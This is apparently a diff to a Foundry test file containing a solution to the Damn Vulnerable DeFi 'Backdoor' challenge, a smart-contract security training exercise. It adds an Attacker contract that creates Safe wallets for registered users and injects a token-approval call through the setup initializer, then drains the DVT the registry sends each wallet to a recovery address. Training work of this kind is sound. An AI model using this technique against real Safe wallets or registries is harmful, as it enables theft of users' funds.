@@ -5,8 +5,71 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
+import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+
+// Safe call this 
+contract Initializer {
+    function approveTokens(address token, address spender) external {
+        IERC20(token).approve(spender, type(uint256).max);
+    }
+}
+
+contract Attacker {
+    constructor(
+        address _walletFactory,
+        address _singletonCopy,
+        address _walletRegistry,
+        address _token,
+        address _recovery,
+        address[] memory users
+    ) {
+        Initializer init = new Initializer();
+
+        for (uint256 i = 0; i < users.length; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+
+            // Encode the `approveTokens` call 
+            bytes memory setupData = abi.encodeWithSelector(
+                init.approveTokens.selector,
+                _token,
+                address(this)
+            );
+
+            // Encode Safe.setup() with the `to`/`data` fields inject our approveTokens call
+            bytes memory initData = abi.encodeWithSignature(
+                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+                owners,          // owners
+                1,               // threshold
+                address(init), // to: called during setup
+                setupData,       // data: approves this contract to spend wallet tokens
+                address(0),      // fallbackHandler
+                address(0),      // paymentToken
+                0,               // payment
+                address(0)       // paymentReceiver
+            );
+
+            // Deploy the proxy: WalletRegistry.proxyCreated() callback sends 10 DVT to the wallet
+            address proxy = address(
+                SafeProxyFactory(_walletFactory).createProxyWithCallback(
+                    _singletonCopy,
+                    initData,
+                    i, // saltNonce: unique per user
+                    IProxyCreationCallback(_walletRegistry)
+                )
+            );
+
+            // Drain the 10 DVT that the registry just sent to the wallet loop 4x = 40 DVT
+            IERC20(_token).transferFrom(proxy, _recovery, IERC20(_token).balanceOf(proxy));
+        }
+    }
+}
+
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +133,15 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        new Attacker(
+            address(walletFactory),
+            address(singletonCopy),
+            address(walletRegistry),
+            address(token),
+            recovery,
+            users
+        );
+        // this is why the exploit works: the `initializer` argument of `SafeProxyFactory.createProxyWithCallback` allows us to execute approveTokens call during the proxy's setup 
     }
 
     /**
